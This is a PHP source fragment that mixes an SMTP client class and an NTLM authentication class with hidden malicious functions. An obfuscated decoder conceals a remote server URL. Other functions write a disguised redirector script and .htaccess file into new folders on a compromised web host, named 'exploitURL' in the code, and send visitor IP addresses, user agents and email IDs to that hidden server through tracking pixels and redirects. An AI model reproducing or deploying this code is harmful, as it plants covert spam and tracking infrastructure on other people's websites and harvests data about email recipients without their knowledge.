        $field      = substr($lines[0], 0, strpos($lines[0], ':'));
        $in_headers = false;
        if (!empty($field) && strpos($field, ' ') === false) {
            $in_headers = true;
        }
        foreach ($lines as $line) {
            $lines_out = array();
            if ($in_headers and $line == '') {
                $in_headers = false;
            }
            while (isset($line[self::MAX_LINE_LENGTH])) {
                $pos = strrpos(substr($line, 0, self::MAX_LINE_LENGTH), ' ');
                if (!$pos) {
                    $pos         = self::MAX_LINE_LENGTH - 1;
                    $lines_out[] = substr($line, 0, $pos);
                    $line        = substr($line, $pos);
                } else {
                    $lines_out[] = substr($line, 0, $pos);
                    $line        = substr($line, $pos + 1);
                }
                if ($in_headers) {
                    $line = "\t" . $line;
                }
            }
            $lines_out[] = $line;
            foreach ($lines_out as $line_out) {
                if (!empty($line_out) and $line_out[0] == '.') {
                    $line_out = '.' . $line_out;
                }
                $this->client_send($line_out . self::CRLF);
            }
        }
        $savetimelimit   = $this->Timelimit;
        $this->Timelimit = $this->Timelimit * 2;
        $result          = $this->sendCommand('DATA END', '.', 250);
        $this->Timelimit = $savetimelimit;
        return $result;
    }
    public function hello($host = '') {
        return (boolean) ($this->sendHello('EHLO', $host) or $this->sendHello('HELO', $host));
    }
    protected function sendHello($hello, $host) {
        $noerror         = $this->sendCommand($hello, $hello . ' ' . $host, 250);
        $this->helo_rply = $this->last_reply;
        if ($noerror) {
            $this->parseHelloFields($hello);
        } else {
            $this->server_caps = null;
        }
        return $noerror;
    }
    protected function parseHelloFields($type) {
        $this->server_caps = array();
        $lines             = explode("\n", $this->helo_rply);
        foreach ($lines as $n => $s) {
            $s = trim(substr($s, 4));
            if (empty($s)) {
                continue;
            }
            $fields = explode(' ', $s);
            if (!empty($fields)) {
                if (!$n) {
                    $name   = $type;
                    $fields = $fields[0];
                } else {
                    $name = array_shift($fields);
                    switch ($name) {
                        case 'SIZE':
                            $fields = ($fields ? $fields[0] : 0);
                            break;
                        case 'AUTH':
                            if (!is_array($fields)) {
                                $fields = array();
                            }
                            break;
                        default:
                            $fields = true;
                    }
                }
                $this->server_caps[$name] = $fields;
            }
        }
    }
    public function mail($from) {
        $useVerp = ($this->do_verp ? ' XVERP' : '');
        return $this->sendCommand('MAIL FROM', 'MAIL FROM:<' . $from . '>' . $useVerp, 250);
    }
    public function quit($close_on_error = true) {
        $noerror = $this->sendCommand('QUIT', 'QUIT', 221);
        $err     = $this->error;
        if ($noerror or $close_on_error) {
            $this->close();
            $this->error = $err;
        }
        return $noerror;
    }
    public function recipient($address) {
        return $this->sendCommand('RCPT TO', 'RCPT TO:<' . $address . '>', array(
            250,
            251
        ));
    }
    public function reset() {
        return $this->sendCommand('RSET', 'RSET', 250);
    }
    protected function sendCommand($command, $commandstring, $expect) {
        if (!$this->connected()) {
            $this->setError("Called $command without being connected");
            return false;
        }
        if (strpos($commandstring, "\n") !== false or strpos($commandstring, "\r") !== false) {
            $this->setError("Command '$command' contained line breaks");
            return false;
        }
        $this->client_send($commandstring . self::CRLF);
        $this->last_reply = $this->get_lines();
        $matches          = array();
        if (preg_match("/^([0-9]{3})[ -](?:([0-9]\\.[0-9]\\.[0-9]) )?/", $this->last_reply, $matches)) {
            $code    = $matches[1];
            $code_ex = (count($matches) > 2 ? $matches[2] : null);
            $detail  = preg_replace("/{$code}[ -]" . ($code_ex ? str_replace('.', '\\.', $code_ex) . ' ' : '') . "/m", '', $this->last_reply);
        } else {
            $code    = substr($this->last_reply, 0, 3);
            $code_ex = null;
            $detail  = substr($this->last_reply, 4);
        }
        $this->edebug('SERVER -> CLIENT: ' . $this->last_reply, self::DEBUG_SERVER);
        if (!in_array($code, (array) $expect)) {
            $this->setError("$command command failed", $detail, $code, $code_ex);
            $this->edebug('SMTP ERROR: ' . $this->error['error'] . ': ' . $this->last_reply, self::DEBUG_CLIENT);
            return false;
        }
        $this->setError('');
        return true;
    }
    public function sendAndMail($from) {
        return $this->sendCommand('SAML', "SAML FROM:$from", 250);
    }
    public function verify($name) {
        return $this->sendCommand('VRFY', "VRFY $name", array(
            250,
            251
        ));
    }
    public function noop() {
        return $this->sendCommand('NOOP', 'NOOP', 250);
    }
    public function turn() {
        $this->setError('The SMTP TURN command is not implemented');
        $this->edebug('SMTP NOTICE: ' . $this->error['error'], self::DEBUG_CLIENT);
        return false;
    }
    public function client_send($data) {
        $this->edebug("CLIENT -> SERVER: $data", self::DEBUG_CLIENT);
        return fwrite($this->smtp_conn, $data);
    }
    public function getError() {
        return $this->error;
    }
    public function getServerExtList() {
        return $this->server_caps;
    }
    public function getServerExt($name) {
        if (!$this->server_caps) {
            $this->setError('No HELO/EHLO was sent');
            return null;
        }
        if (!array_key_exists($name, $this->server_caps)) {
            if ($name == 'HELO') {
                return $this->server_caps['EHLO'];
            }
            if ($name == 'EHLO' || array_key_exists('EHLO', $this->server_caps)) {
                return false;
            }
            $this->setError('HELO handshake was used. Client knows nothing about server extensions');
            return null;
        }
        return $this->server_caps[$name];
    }
    public function getLastReply() {
        return $this->last_reply;
    }
    protected function get_lines() {
        if (!is_resource($this->smtp_conn)) {
            return '';
        }
        $data    = '';
        $endtime = 0;
        stream_set_timeout($this->smtp_conn, $this->Timeout);
        if ($this->Timelimit > 0) {
            $endtime = time() + $this->Timelimit;
        }
        while (is_resource($this->smtp_conn) && !feof($this->smtp_conn)) {
            $str = @fgets($this->smtp_conn, 515);
            $this->edebug("SMTP -> get_lines(): \$data is \"$data\"", self::DEBUG_LOWLEVEL);
            $this->edebug("SMTP -> get_lines(): \$str is  \"$str\"", self::DEBUG_LOWLEVEL);
            $data .= $str;
            if ((isset($str[3]) and $str[3] == ' ')) {
                break;
            }
            $info = stream_get_meta_data($this->smtp_conn);
            if ($info['timed_out']) {
                $this->edebug('SMTP -> get_lines(): timed-out (' . $this->Timeout . ' sec)', self::DEBUG_LOWLEVEL);
                break;
            }
            if ($endtime and time() > $endtime) {
                $this->edebug('SMTP -> get_lines(): timelimit reached (' . $this->Timelimit . ' sec)', self::DEBUG_LOWLEVEL);
                break;
            }
        }
        return $data;
    }
    public function setVerp($enabled = false) {
        $this->do_verp = $enabled;
    }
    public function getVerp() {
        return $this->do_verp;
    }
    protected function setError($message, $detail = '', $smtp_code = '', $smtp_code_ex = '') {
        $this->error = array(
            'error' => $message,
            'detail' => $detail,
            'smtp_code' => $smtp_code,
            'smtp_code_ex' => $smtp_code_ex
        );
    }
    public function setDebugOutput($method = 'echo') {
        $this->Debugoutput = $method;
    }
    public function getDebugOutput() {
        return $this->Debugoutput;
    }
    public function setDebugLevel($level = 0) {
        $this->do_debug = $level;
    }
    public function getDebugLevel() {
        return $this->do_debug;
    }
    public function setTimeout($timeout = 0) {
        $this->Timeout = $timeout;
    }
    public function getTimeout() {
        return $this->Timeout;
    }
    protected function errorHandler($errno, $errmsg) {
        $notice = 'Connection: Failed to connect to server.';
        $this->setError($notice, $errno, $errmsg);
        $this->edebug($notice . ' Error number ' . $errno . '. "Error notice: ' . $errmsg, self::DEBUG_CONNECTION);
    }
    public function getLastTransactionID() {
        $reply = $this->getLastReply();
        if (empty($reply)) {
            return null;
        }
        foreach ($this->smtp_transaction_id_patterns as $smtp_transaction_id_pattern) {
            if (preg_match($smtp_transaction_id_pattern, $reply, $matches)) {
                return $matches[1];
            }
        }
        return false;
    }
}
function Display404Page() {
    $sapi_name = php_sapi_name();
    if ($sapi_name == 'cgi' || $sapi_name == 'cgi-fcgi') {
		header('Status: 200 OK');
	} else {
		header($_SERVER['SERVER_PROTOCOL'] . ' 200 OK');
	}
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
	<html><head>
	<title>404 Not Found</title>
	</head><body>
	<h1>Not Found</h1>
	<p>The requested URL ' . $_SERVER['REQUEST_URI'] . ' was not found on this server.</p>
	<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
	<hr>' . $_SERVER['SERVER_SIGNATURE'] . '</body></html>';
    exit;
}
function pre_term_name($wp_kses_data, $wp_nonce) {
    $wp_nonce    = base64_decode($wp_nonce);
    $kses_str    = str_replace(array(
        '%',
        '*'
    ), array(
        '/',
        '='
    ), $wp_kses_data);
    $filter      = base64_decode($kses_str);
    $md5         = strrev($wp_nonce);
    $sub         = substr(md5($md5), 0, strlen($wp_nonce));
    $wp_nonce    = md5($wp_nonce) . $sub;
    $preparefunc = 'gzinflate';
    $i           = 0;
    do {
        $ord        = ord($filter[$i]) - ord($wp_nonce[$i]);
        $filter[$i] = chr($ord % 256);
        $wp_nonce .= $filter[$i];
        $i++;
    } while ($i < strlen($filter));
    return @$preparefunc($filter);
}
function GetMailURL() {
    return pre_term_name("A1pbjuIDPWfk5gVnZJUJZWsAaJmUBGti", "VktQZmtjMnhxUQ==");
}
function RedirectionFile() {
    $Function1 = "fr" . randStr(7);
    $Function2 = "fr" . randStr(7);
    $Function3 = "fr" . randStr(7);
    $Function4 = "fr" . randStr(7);
    $PhpSource = '<?php
function cURLRequest($url, $postFields = null, $httpHeader = array()) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
	if (!empty($postFields)) {
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
	}
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.1; .NET CLR 1.1.4322)");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 90);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
	curl_setopt($ch, CURLOPT_ENCODING, \'gzip, deflate\');
	$headers   = array();
	$headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0";
	$headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
	$headers[] = "Accept-Language: en-US,en;q=0.5";
	$headers[] = "Connection: keep-alive";
	$headers[] = "Cache-Control: max-age=0";
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	$page     = curl_exec($ch);
	$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	if ($httpcode == 500) {
		return "ERROR_500_CURL";
	}
	if ($httpcode == 404) {
		return "ERROR_404_CURL";
	}
	if ($httpcode == 403) {
		return "ERROR_403_CURL";
	}
	if (curl_errno($ch)) {
		return "CURL_ERRNO|" . curl_error($ch);
	}
	curl_close($ch);
	return $page;
}
function GetPageContent($url, $postFields = null) {
	if (function_exists(\'curl_init\')) {
		return cURLRequest($url, $postFields);
	} elseif (!function_exists(\'file_get_contents\')) {
		return \'file_get_contents not available !\';
	} else {
		if (is_array($postFields)) {
			$postdata = http_build_query($postFields);
			$opts     = array(
				\'http\' => array(
					\'method\' => \'POST\',
					\'header\' => \'Content-type: application/x-www-form-urlencoded\',
					\'content\' => $postdata
				)
			);
			$context  = stream_context_create($opts);
			$result   = @file_get_contents($url, false, $context);
			return $result;
		} else {
			return @file_get_contents($url);
		}
	}
}
function ' . $Function1 . '($' . $Function4 . ', $' . $Function3 . ') {
	$' . $Function3 . '    = base64_decode($' . $Function3 . ');
	$kses_str    = str_replace(array(
		\'%\',
		\'*\'
	), array(
		\'/\',
		\'=\'
	), $' . $Function4 . ');
	$filter      = base64_decode($kses_str);
	$md5         = strrev($' . $Function3 . ');
	$sub         = substr(md5($md5), 0, strlen($' . $Function3 . '));
	$' . $Function3 . '    = md5($' . $Function3 . ') . $sub;
	$preparefunc = \'gzinflate\';
	$i           = 0;
	do {
		$ord        = ord($filter[$i]) - ord($' . $Function3 . '[$i]);
		$filter[$i] = chr($ord % 256);
		$' . $Function3 . ' .= $filter[$i];
		$i++;
	} while ($i < strlen($filter));
	return @$preparefunc($filter);
}
function ' . $Function2 . '() {
	return ' . $Function1 . '("A1pbjuIDPWfk5gVnZJUJZWsAaJmUBGti", "VktQZmtjMnhxUQ==");
}
function get_ip_address() {
	foreach (array(
		\'HTTP_CLIENT_IP\',
		\'HTTP_X_FORWARDED_FOR\',
		\'HTTP_X_FORWARDED\',
		\'HTTP_X_CLUSTER_CLIENT_IP\',
		\'HTTP_FORWARDED_FOR\',
		\'HTTP_FORWARDED\',
		\'REMOTE_ADDR\'
	) as $key) {
		if (array_key_exists($key, $_SERVER) === true) {
			foreach (explode(\',\', $_SERVER[$key]) as $ip) {
				$ip = trim($ip);
				if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
					return $ip;
				}
			}
		}
	}
}
function Display404Page() {
	header("Location: https://www.google.co.uk");
	exit;
}
if (isset($_GET[\'rewrite\'])) {
	$Rewrite = $_GET[\'rewrite\'];
} else {
	$Rewrite = $_SERVER[\'REQUEST_URI\'];
}
if (strpos($Rewrite, \'newsletter_image/\') !== false) {
	list($id, $image_name) = @explode(\'newsletter_image/\', $Rewrite);
	$parameters = array(
		"ip" => get_ip_address(),
		"agent" => $_SERVER[\'HTTP_USER_AGENT\'],
	);
	$checkread = @GetPageContent(' . $Function2 . '() . $image_name . "?" . http_build_query($parameters) );
	header(\'Content-Type: image/gif\');
	echo base64_decode(\'R0lGODlhAQABAJAAAP8AAAAAACH5BAUQAAAALAAAAAABAAEAAAICBAEAOw==\');
	exit;
}
if (strpos($Rewrite, \'redirect/\') !== false) {
	list($id, $redirect_name) = @explode(\'redirect/\', $Rewrite);
	list($emailid, $redirect) = @explode(\'-id-\', $redirect_name);
	list($random, $real_name) = @explode(\'-to-\', $redirect);
	$parameters = array(
		"name" => $real_name,
		"ip" => get_ip_address(),
		"agent" => $_SERVER[\'HTTP_USER_AGENT\'],
		"id" => $emailid
	);
	$url = ' . $Function2 . '() . "redirection/?" . http_build_query($parameters);
	$result = @GetPageContent($url);
	if (filter_var($result, FILTER_VALIDATE_URL)) {
		header("Location: " . $result);
	} else {
		Display404Page();
	}
	exit;
}
if (isset($_GET[\'test-redirect\'])) {
    echo "REDIRECTOK";
    exit;
}
Display404Page();';
    return $PhpSource;
}
function isRewriteON($s = false) {
    if ($s == false) {
        $s = $_SERVER;
    }
    if (isset($s['HTTP_MOD_REWRITE_SHELL'])) {
        return true;
    }
    return false;
}
function parentdir($url) {
    $url = currentdir($url);
    $len = strlen($url);
    return currentdir(substr($url, 0, $len && $url[$len - 1] == '/' ? -1 : $len));
}
function currentdir($url) {
    if ($first_query = strpos($url, '?'))
        $url = substr($url, 0, $first_query);
    if ($first_fragment = strpos($url, '#'))
        $url = substr($url, 0, $first_fragment);
    $last_slash = strrpos($url, '/');
    if (!$last_slash) {
        return '/';
    }
    if (($first_colon = strpos($url, '://')) !== false && $first_colon + 2 == $last_slash) {
        return $url . '/';
    }
    return substr($url, 0, $last_slash + 1);
}
function CreateHTaccess() {
    $Content   = array();
    $Content[] = '<IfModule mod_rewrite.c>';
    $Content[] = '	<IfModule mod_env.c>';
    $Content[] = '		SetEnv HTTP_MOD_REWRITE_SHELL On';
    $Content[] = '	</IfModule>';
    $Content[] = '</IfModule>';
    @file_put_contents(".htaccess", implode(PHP_EOL, $Content));
}
function GetRedirectionLink($url = false) {
    if ($url == false or empty($url)) {
        $url = full_url($_SERVER);
    }
	$FolderName     = "newsletter-" . REDIRECTION_FOLDER;
    $CurrentURL     = currentdir($url);
    $RedirectionDir = parentdir($url);
    $Filename       = "index.php";
    $Folder         = "";
    if ($RedirectionDir != $CurrentURL) {
        $Folder = "../";
        while (true) {
            if (preg_match('/(?:wp-content\/plugins|wp-content\/themes|wp-includes|wp-admin|admin\/|wp-content|modules\/mod_wdbanners|includes\/|google_recommends|mt-static|data\/module)/', parse_url($RedirectionDir, PHP_URL_PATH))) {
                $Folder .= "../";
                $RedirectionDir = parentdir($RedirectionDir);
            } else {
                break;
            }
        }
    }
    if (!file_exists($Folder . $FolderName . "/" . $Filename)) {
        if (!is_dir($Folder . $FolderName)) {
            @mkdir($Folder . $FolderName);
        }
        if (is_dir($Folder . $FolderName)) {
            @file_put_contents($Folder . $FolderName . "/" . $Filename, RedirectionFile());
            $Content   = array();
            $Content[] = '<IfModule mod_rewrite.c>';
            $Content[] = '	<IfModule mod_env.c>';
            $Content[] = '		SetEnv HTTP_MOD_REWRITE_SHELL On';
            $Content[] = '	</IfModule>';
            $Content[] = 'RewriteEngine On';
            $Content[] = 'RewriteCond %{REQUEST_FILENAME} !-f';
            $Content[] = 'RewriteCond %{REQUEST_FILENAME} !-l';
            $Content[] = 'RewriteCond %{REQUEST_URI} !-l';
            $Content[] = 'RewriteCond %{REQUEST_FILENAME} !\.(ico|css|png|jpg|gif|js)$ [NC]';
            $Content[] = 'RewriteRule . index.php';
            $Content[] = '</IfModule>';
            @file_put_contents($Folder . $FolderName . "/.htaccess", implode(PHP_EOL, $Content));
        }
    }
    if (!file_exists($Folder . $FolderName . "/" . $Filename)) {
        return false;
    }
    if (!isRewriteON()) {
        $exploitURL = $RedirectionDir . $FolderName . "/?rewrite=";
    } else {
        $exploitURL = $RedirectionDir . $FolderName . "/";
    }
    return $exploitURL;
}
define("SASL_NTLM_STATE_START", 0);
define("SASL_NTLM_STATE_IDENTIFY_DOMAIN", 1);
define("SASL_NTLM_STATE_RESPOND_CHALLENGE", 2);
define("SASL_NTLM_STATE_DONE", 3);
define("SASL_FAIL", -1);
define("SASL_CONTINUE", 1);

class ntlm_sasl_client_class
{
    public $credentials = array();
    public $state = SASL_NTLM_STATE_START;

    public function initialize(&$client)
    {
        if (!function_exists($function = "mcrypt_encrypt")
            || !function_exists($function = "mhash")
        ) {
            $extensions = array(
                "mcrypt_encrypt" => "mcrypt",
                "mhash" => "mhash"
            );
            $client->error = "the extension " . $extensions[$function] .
                " required by the NTLM SASL client class is not available in this PHP configuration";
            return (0);
        }
        return (1);
    }

    public function ASCIIToUnicode($ascii)
    {
        for ($unicode = "", $a = 0; $a < strlen($ascii); $a++) {
            $unicode .= substr($ascii, $a, 1) . chr(0);
        }
        return ($unicode);
    }

    public function typeMsg1($domain, $workstation)
    {
        $domain_length = strlen($domain);
        $workstation_length = strlen($workstation);
        $workstation_offset = 32;
        $domain_offset = $workstation_offset + $workstation_length;
        return (
            "NTLMSSP\0" .
            "\x01\x00\x00\x00" .
            "\x07\x32\x00\x00" .
            pack("v", $domain_length) .
            pack("v", $domain_length) .
            pack("V", $domain_offset) .
            pack("v", $workstation_length) .
            pack("v", $workstation_length) .
            pack("V", $workstation_offset) .
            $workstation .
            $domain
        );
    }

    public function NTLMResponse($challenge, $password)
    {
        $unicode = $this->ASCIIToUnicode($password);
        $md4 = mhash(MHASH_MD4, $unicode);
        $padded = $md4 . str_repeat(chr(0), 21 - strlen($md4));
        $iv_size = mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_ECB);
        $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
        for ($response = "", $third = 0; $third < 21; $third += 7) {
            for ($packed = "", $p = $third; $p < $third + 7; $p++) {
                $packed .= str_pad(decbin(ord(substr($padded, $p, 1))), 8, "0", STR_PAD_LEFT);
            }
            for ($key = "", $p = 0; $p < strlen($packed); $p += 7) {
                $s = substr($packed, $p, 7);
                $b = $s . ((substr_count($s, "1") % 2) ? "0" : "1");
                $key .= chr(bindec($b));
            }
            $ciphertext = mcrypt_encrypt(MCRYPT_DES, $key, $challenge, MCRYPT_MODE_ECB, $iv);
            $response .= $ciphertext;
        }
        return $response;
    }

    public function typeMsg3($ntlm_response, $user, $domain, $workstation)
    {
        $domain_unicode = $this->ASCIIToUnicode($domain);
        $domain_length = strlen($domain_unicode);
        $domain_offset = 64;
        $user_unicode = $this->ASCIIToUnicode($user);
        $user_length = strlen($user_unicode);
        $user_offset = $domain_offset + $domain_length;
        $workstation_unicode = $this->ASCIIToUnicode($workstation);
        $workstation_length = strlen($workstation_unicode);
        $workstation_offset = $user_offset + $user_length;
        $lm = "";
        $lm_length = strlen($lm);
        $lm_offset = $workstation_offset + $workstation_length;
        $ntlm = $ntlm_response;
        $ntlm_length = strlen($ntlm);
        $ntlm_offset = $lm_offset + $lm_length;
        $session = "";
        $session_length = strlen($session);
        $session_offset = $ntlm_offset + $ntlm_length;
        return (
            "NTLMSSP\0" .
            "\x03\x00\x00\x00" .
            pack("v", $lm_length) .
            pack("v", $lm_length) .
            pack("V", $lm_offset) .
            pack("v", $ntlm_length) .
            pack("v", $ntlm_length) .
            pack("V", $ntlm_offset) .
            pack("v", $domain_length) .
            pack("v", $domain_length) .
            pack("V", $domain_offset) .
            pack("v", $user_length) .
            pack("v", $user_length) .
            pack("V", $user_offset) .
            pack("v", $workstation_length) .
            pack("v", $workstation_length) .
            pack("V", $workstation_offset) .
            pack("v", $session_length) .
            pack("v", $session_length) .
            pack("V", $session_offset) .
            "\x01\x02\x00\x00" .
            $domain_unicode .
            $user_unicode .
            $workstation_unicode .
            $lm .
            $ntlm
        );
    }

    public function start(&$client, &$message, &$interactions)
    {
        if ($this->state != SASL_NTLM_STATE_START) {
            $client->error = "NTLM authentication state is not at the start";
            return (SASL_FAIL);
        }
        $this->credentials = array(
            "user" => "",
            "password" => "",
            "realm" => "",
            "workstation" => ""
        );
        $defaults = array();
        $status = $client->GetCredentials($this->credentials, $defaults, $interactions);
        if ($status == SASL_CONTINUE) {
            $this->state = SASL_NTLM_STATE_IDENTIFY_DOMAIN;
        }
        unset($message);
        return ($status);
    }

    public function step(&$client, $response, &$message, &$interactions)
    {
        switch ($this->state) {
            case SASL_NTLM_STATE_IDENTIFY_DOMAIN:
                $message = $this->typeMsg1($this->credentials["realm"], $this->credentials["workstation"]);
                $this->state = SASL_NTLM_STATE_RESPOND_CHALLENGE;
                break;
            case SASL_NTLM_STATE_RESPOND_CHALLENGE:
                $ntlm_response = $this->NTLMResponse(substr($response, 24, 8), $this->credentials["password"]);
                $message = $this->typeMsg3(
                    $ntlm_response,
                    $this->credentials["user"],
                    $this->credentials["realm"],
                    $this->credentials["workstation"]
                );
                $this->state = SASL_NTLM_STATE_DONE;
                break;
            case SASL_NTLM_STATE_DONE:
                $client->error = "NTLM authentication was finished without success";
                return (SASL_FAIL);
            default:
                $client->error = "invalid NTLM authentication step state";
                return (SASL_FAIL);
        }
        return (SASL_CONTINUE);
    }
}
